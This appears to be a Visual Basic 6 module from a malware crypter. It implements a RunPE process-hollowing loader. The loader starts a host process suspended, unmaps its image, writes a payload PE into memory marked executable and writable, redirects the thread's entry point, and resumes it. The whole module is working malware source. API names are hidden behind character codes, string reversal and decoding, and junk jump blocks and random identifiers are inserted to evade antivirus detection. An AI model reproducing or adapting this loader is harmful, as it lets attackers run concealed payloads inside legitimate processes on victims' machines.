Attribute VB_Name = "Module2"
Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type


Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualSize As Long
    VirtualAddress  As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type



Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type
Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long

Declare Sub RtlMoveMemory Lib "kernel32" (dest As Any, src As Any, ByVal L As Long)
Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long
Public Function cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(ByVal sLib As String, ByVal sMod As String, ParamArray Params()) As Long
GoTo 12:
12:
Dim ocss As String
Dim xUwH As String
If ocss = xUwH Then
DoEvents
End If
    Dim bvASM(64)   As Byte 'enought to hold code + 10 params
GoTo 24:
24:
Dim UFgD As String
Dim spRz As String
If UFgD = spRz Then
DoEvents
End If
    Dim i           As Long
GoTo 36:
36:
Dim qZBv As String
Dim Nklr As String
If qZBv = Nklr Then
DoEvents
End If
    Dim lPos        As Long
GoTo 48:
48:
Dim WcPf As String
Dim tNzb As String
If WcPf = tNzb Then
DoEvents
End If
    Dim sVal        As String
GoTo 60:
60:
Dim RXkx As String
Dim piUT As String
If RXkx = piUT Then
DoEvents
End If

GoTo 72:
72:
Dim xaYi As String
Dim VKIe As String
If xaYi = VKIe Then
DoEvents
End If
    bvASM(0) = &H58: bvASM(1) = &H59: bvASM(2) = &H59
GoTo 84:
84:
Dim svtZ As String
Dim QfdV As String
If svtZ = QfdV Then
DoEvents
End If
    bvASM(3) = &H59: bvASM(4) = &H59: bvASM(5) = &H50
GoTo 96:
96:
Dim OQOR As String
Dim wirG As String
If OQOR = wirG Then
DoEvents
End If
   
GoTo 108:
108:
Dim utCC As String
Dim RDMY As String
If utCC = RDMY Then
DoEvents
End If
    lPos = 6
GoTo 120:
120:
Dim pnxu As String
Dim xgAI As String
If pnxu = xgAI Then
DoEvents
End If
   
GoTo 132:
132:
Dim VQke As String
Dim tBva As String
If VQke = tBva Then
DoEvents
End If
    For i = UBound(Params) To 0 Step -1
GoTo 144:
144:
Dim QlFw As String
Dim oWQS As String
If QlFw = oWQS Then
DoEvents
End If
        bvASM(lPos) = &H68: lPos = lPos + 1
GoTo 156:
156:
Dim wOTh As String
Dim UzEc As String
If wOTh = UzEc Then
DoEvents
End If
        sVal = (Params(i)): GoSub PutLong: lPos = lPos + 4
GoTo 168:
168:
Dim SJoY As String
Dim pTzU As String
If SJoY = pTzU Then
DoEvents
End If
    Next
GoTo 180:
180:
Dim NeJQ As String
Dim VwNF As String
If NeJQ = VwNF Then
DoEvents
End If
   
GoTo 192:
192:
Dim tHXB As String
Dim RriX As String
If tHXB = RriX Then
DoEvents
End If
    bvASM(lPos) = &HE8: lPos = lPos + 1
GoTo 204:
204:
Dim GXhg As String
Dim OqkV As String
If GXhg = OqkV Then
DoEvents
End If
    sVal = GetProcAddress(LoadLibraryA(sLib), sMod) - VarPtr(bvASM(lPos)) - 4
GoTo 216:
216:
Dim laVR As String
Dim JKFn As String
If laVR = JKFn Then
DoEvents
End If
    GoSub PutLong: lPos = lPos + 4
GoTo 228:
228:
Dim hvqi As String
Dim ffae As String
If hvqi = ffae Then
DoEvents
End If
    bvASM(lPos) = &HC3
GoTo 240:
240:
Dim NYet As String
Dim Kiop As String
If NYet = Kiop Then
DoEvents
End If
    cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh = CallWindowProcA(VarPtr(bvASM(0)), 0, 0, 0, 0)
GoTo 252:
252:
Dim itZl As String
Dim GDJH As String
If itZl = GDJH Then
DoEvents
End If
   
GoTo 264:
264:
Dim OVNv As String
Dim mgXr As String
If OVNv = mgXr Then
DoEvents
End If
    Exit Function
GoTo 276:
276:
Dim JQiN As String
Dim hBsJ As String
If JQiN = hBsJ Then
DoEvents
End If
PutLong:
GoTo 288:
288:
Dim FlCF As String
Dim NeGU As String
If FlCF = NeGU Then
DoEvents
End If
    'This is cheap replacement for RtlMoveMemory/putmem4 (hi/lo word/byte)
GoTo 300:
300:
Dim lOQQ As String
Dim iyBL As String
If lOQQ = iyBL Then
DoEvents
End If
    sVal = Right$(String(8, Chr(48)) & Hex(sVal), 8)
GoTo 312:
312:
Dim GJlh As String
Dim oBpW As String
If GJlh = oBpW Then
DoEvents
End If
    bvASM(lPos + 0) = (Chr(38) & Chr(104) & Mid$(sVal, 7, 2))
GoTo 324:
324:
Dim mmzS As String
Dim KwKo As String
If mmzS = KwKo Then
DoEvents
End If
    bvASM(lPos + 1) = (Chr(38) & Chr(104) & Mid$(sVal, 5, 2))
GoTo 336:
336:
Dim hHUk As String
Dim Frff As String
If hHUk = Frff Then
DoEvents
End If
    bvASM(lPos + 2) = (Chr(38) & Chr(104) & Mid$(sVal, 3, 2))
GoTo 348:
348:
Dim NkIu As String
Dim lUtq As String
If NkIu = lUtq Then
DoEvents
End If
    bvASM(lPos + 3) = (Chr(38) & Chr(104) & Mid$(sVal, 1, 2))
GoTo 360:
360:
Dim JEdm As String
Dim HpOI As String
If JEdm = HpOI Then
DoEvents
End If
    Return
GoTo 372:
372:
Dim eZYE As String
Dim MSCS As String
If eZYE = MSCS Then
DoEvents
End If
End Function



Sub ROOOOOOOOOOOOOOOOOOOOOOOOOOON(sHost As String, lpBuffer() As Byte, cmdline As String)
On Error Resume Next
Dim QYASCASDgQSvcs As IMAGE_DOS_HEADER
Dim TgustaSGAsmuxorAPI As IMAGE_NT_HEADERS
Dim CApitarSAHardina As IMAGE_SECTION_HEADER
Dim SioEFairuys As STARTUPINFO
Dim XDpiopioPISDXD As PROCESS_INFORMATION
Dim WHYDONvDSqASV As CONTEXT
Dim i As Long

    SioEFairuys.cb = Len(SioEFairuys)
    WHYDONvDSqASV.ContextFlags = CONTEXT_FULL

    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(113) & Chr(122) & Chr(103) & Chr(101) & Chr(109) & Chr(69) & Chr(109) & Chr(126) & Chr(103) & Chr(69) & Chr(100) & Chr(124) & Chr(90))), VarPtr(QYASCASDgQSvcs), VarPtr(lpBuffer(0)), Len(QYASCASDgQSvcs))
    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(113) & Chr(122) & Chr(103) & Chr(101) & Chr(109) & Chr(69) & Chr(109) & Chr(126) & Chr(103) & Chr(69) & Chr(100) & Chr(124) & Chr(90))), VarPtr(TgustaSGAsmuxorAPI), VarPtr(lpBuffer(QYASCASDgQSvcs.e_lfanew)), Len(TgustaSGAsmuxorAPI))
    CreateProcessA sHost, Chr(32) & cmdline, 0, 0, False, CREATE_SUSPENDED, 0, 0, SioEFairuys, XDpiopioPISDXD
  
    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(Chr(110) & Chr(116) & Chr(100) & Chr(108) & Chr(108), Chr(78) & Chr(116) & Chr(85) & Chr(110) & Chr(109) & Chr(97) & Chr(112) & Chr(86) & Chr(105) & Chr(101) & Chr(119) & Chr(79) & Chr(102) & Chr(83) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110), XDpiopioPISDXD.hProcess, TgustaSGAsmuxorAPI.OptionalHeader.ImageBase)
    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(112) & Chr(77) & Chr(107) & Chr(103) & Chr(100) & Chr(100) & Chr(73) & Chr(100) & Chr(105) & Chr(125) & Chr(124) & Chr(122) & Chr(97) & Chr(94))), XDpiopioPISDXD.hProcess, TgustaSGAsmuxorAPI.OptionalHeader.ImageBase, TgustaSGAsmuxorAPI.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(113) & Chr(122) & Chr(103) & Chr(101) & Chr(109) & Chr(69) & Chr(123) & Chr(123) & Chr(109) & Chr(107) & Chr(103) & Chr(122) & Chr(88) & Chr(109) & Chr(124) & Chr(97) & Chr(122) & Chr(95))), XDpiopioPISDXD.hProcess, TgustaSGAsmuxorAPI.OptionalHeader.ImageBase, VarPtr(lpBuffer(0)), TgustaSGAsmuxorAPI.OptionalHeader.SizeOfHeaders, 0)

For i = 0 To TgustaSGAsmuxorAPI.FileHeader.NumberOfSections - 1

    RtlMoveMemory CApitarSAHardina, lpBuffer(QYASCASDgQSvcs.e_lfanew + Len(TgustaSGAsmuxorAPI) + Len(CApitarSAHardina) * i), Len(CApitarSAHardina)
    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(113) & Chr(122) & Chr(103) & Chr(101) & Chr(109) & Chr(69) & Chr(123) & Chr(123) & Chr(109) & Chr(107) & Chr(103) & Chr(122) & Chr(88) & Chr(109) & Chr(124) & Chr(97) & Chr(122) & Chr(95))), XDpiopioPISDXD.hProcess, TgustaSGAsmuxorAPI.OptionalHeader.ImageBase + CApitarSAHardina.VirtualAddress, VarPtr(lpBuffer(CApitarSAHardina.PointerToRawData)), CApitarSAHardina.SizeOfRawData, 0)

Next

    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(124) & Chr(112) & Chr(109) & Chr(124) & Chr(102) & Chr(103) & Chr(75) & Chr(108) & Chr(105) & Chr(109) & Chr(122) & Chr(96) & Chr(92) & Chr(124) & Chr(109) & Chr(79))), XDpiopioPISDXD.hThread, VarPtr(WHYDONvDSqASV))
    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(113) & Chr(122) & Chr(103) & Chr(101) & Chr(109) & Chr(69) & Chr(123) & Chr(123) & Chr(109) & Chr(107) & Chr(103) & Chr(122) & Chr(88) & Chr(109) & Chr(124) & Chr(97) & Chr(122) & Chr(95))), XDpiopioPISDXD.hProcess, WHYDONvDSqASV.Ebx + 8, VarPtr(TgustaSGAsmuxorAPI.OptionalHeader.ImageBase), 4, 0)
    WHYDONvDSqASV.Eax = TgustaSGAsmuxorAPI.OptionalHeader.ImageBase + TgustaSGAsmuxorAPI.OptionalHeader.AddressOfEntryPoint
    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(124) & Chr(112) & Chr(109) & Chr(124) & Chr(102) & Chr(103) & Chr(75) & Chr(108) & Chr(105) & Chr(109) & Chr(122) & Chr(96) & Chr(92) & Chr(124) & Chr(109) & Chr(91))), XDpiopioPISDXD.hThread, VarPtr(WHYDONvDSqASV))
    Call cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(108) & Chr(105) & Chr(109) & Chr(122) & Chr(96) & Chr(92) & Chr(109) & Chr(101) & Chr(125) & Chr(123) & Chr(109) & Chr(90))), XDpiopioPISDXD.hThread)

End Sub

Public Function w2zxzkbdgwdgrgazm1jw39hervhtn2w8pisu3qe0br095g0ay2() As String
GoTo 12:
12:
Dim gpqF As String
Dim EZbb As String
If gpqF = EZbb Then
DoEvents
End If
    Dim lRet        As Long
GoTo 24:
24:
Dim cKLx As String
Dim kcPL As String
If cKLx = kcPL Then
DoEvents
End If
    Dim bvBuff(255) As Byte
GoTo 36:
36:
Dim HnZh As String
Dim fXkd As String
If HnZh = fXkd Then
DoEvents
End If
    lRet = cqpqe5y1v2lbnz27jyitmx6o3r0lziyymk2bygx69p6q11rmbh(axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(58) & Chr(59) & Chr(100) & Chr(109) & Chr(102) & Chr(122) & Chr(109) & Chr(99))), axl6aepcdht8o8xfnnqrl96awy8tm5ysz030j6637aqgqkbum3(StrReverse(Chr(73) & Chr(109) & Chr(101) & Chr(105) & Chr(70) & Chr(109) & Chr(100) & Chr(97) & Chr(78) & Chr(109) & Chr(100) & Chr(125) & Chr(108) & Chr(103) & Chr(69) & Chr(124) & Chr(109) & Chr(79))), App.hInstance, VarPtr(bvBuff(0)), 256)
GoTo 48:
48:
Dim Dhuz As String
Dim Layo As String
If Dhuz = Layo Then
DoEvents
End If
    w2zxzkbdgwdgrgazm1jw39hervhtn2w8pisu3qe0br095g0ay2 = Left$(StrConv(bvBuff, vbUnicode), lRet)
GoTo 60:
60:
Dim jKik As String
Dim GvTg As String
If jKik = GvTg Then
DoEvents
End If
End Function



Public Function ya3r7izm9r0vg0evhkolqmgvjqqc043audj8ck8t17igjochay(ByVal Expression As String, Optional ByVal Delimiter As String, Optional ByVal Limit As Long = -1) As String()
Dim ASEvasEW As Long
Dim TSsETsVEWSTYAsvasd As Long
Dim asTYQEGHaxdBADFsdg As Long
Dim asHQYREGdfghFDHSdfGHd As Long
Dim rteIUJFBfdSGHaDFFQErtgSAFvh As Long
Dim ASTgasdvASDqQtASVASdfWERfsgq() As String
asTYQEGHaxdBADFsdg = Len(Expression)
If Delimiter = vbNullString Then Delimiter = Chr(32)
asHQYREGdfghFDHSdfGHd = Len(Delimiter)
If Limit = 0 Then GoTo QuitHere
If asTYQEGHaxdBADFsdg = 0 Then GoTo QuitHere
If InStr(1, Expression, Delimiter, vbBinaryCompare) = 0 Then GoTo QuitHere
ReDim ASTgasdvASDqQtASVASdfWERfsgq(0)
ASEvasEW = 1
TSsETsVEWSTYAsvasd = 1
Do
If rteIUJFBfdSGHaDFFQErtgSAFvh + 1 = Limit Then
ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh) = Mid$(Expression, ASEvasEW)
Exit Do
End If
TSsETsVEWSTYAsvasd = InStr(TSsETsVEWSTYAsvasd, Expression, Delimiter, vbBinaryCompare)
If TSsETsVEWSTYAsvasd = 0 Then
If Not ASEvasEW = asTYQEGHaxdBADFsdg Then
ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh) = Mid$(Expression, ASEvasEW)
End If
Exit Do
End If
ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh) = Mid$(Expression, ASEvasEW, TSsETsVEWSTYAsvasd - ASEvasEW)
rteIUJFBfdSGHaDFFQErtgSAFvh = rteIUJFBfdSGHaDFFQErtgSAFvh + 1
ReDim Preserve ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh)
ASEvasEW = TSsETsVEWSTYAsvasd + asHQYREGdfghFDHSdfGHd
TSsETsVEWSTYAsvasd = ASEvasEW
Loop
ReDim Preserve ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh)
ya3r7izm9r0vg0evhkolqmgvjqqc043audj8ck8t17igjochay = ASTgasdvASDqQtASVASdfWERfsgq
Exit Function
QuitHere:
ReDim ya3r7izm9r0vg0evhkolqmgvjqqc043audj8ck8t17igjochay(-1 To -1)
End Function





